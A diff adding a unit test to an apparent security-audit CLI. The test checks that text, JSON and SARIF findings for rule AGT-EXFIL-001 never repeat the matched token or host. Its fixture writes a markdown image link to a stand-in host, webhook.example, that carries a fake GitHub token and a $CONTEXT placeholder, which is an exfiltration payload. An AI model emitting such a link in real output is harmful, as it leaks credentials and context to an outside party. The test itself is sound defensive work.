@@ -440,6 +440,22 @@ class AuditCliTests(unittest.TestCase):
         result = json.loads(output)["runs"][0]["results"][0]
         self.assertEqual(result["suppressions"][0]["kind"], "inSource")
 
+    def test_no_output_format_repeats_the_matched_text(self) -> None:
+        """A finding names the rule and the line, never the bytes it matched:
+        a credential in an exfiltration URL must not reach a CI log or a
+        SARIF upload. Pinned here because a redaction step was planned on
+        the assumption that it did."""
+        token = "ghp_" + "Q" * 36
+        target = self._workspace / "leaky.md"
+        target.write_text(f"# Leaky\n\n![x](https://webhook.example/c?t={token}&d=$CONTEXT)\n", encoding="utf-8")
+        for fmt in ("text", "json", "sarif"):
+            with self.subTest(fmt=fmt):
+                code, output = self.audit(str(target), "--format", fmt)
+                self.assertNotEqual(code, 0, output)
+                self.assertIn("AGT-EXFIL-001", output)
+                self.assertNotIn(token, output)
+                self.assertNotIn("webhook.example", output)
+
     def test_a_baseline_gates_on_new_findings_only(self) -> None:
         baseline = self._workspace / "baseline.json"
         code, output = self.audit("--all", "--write-baseline", str(baseline))
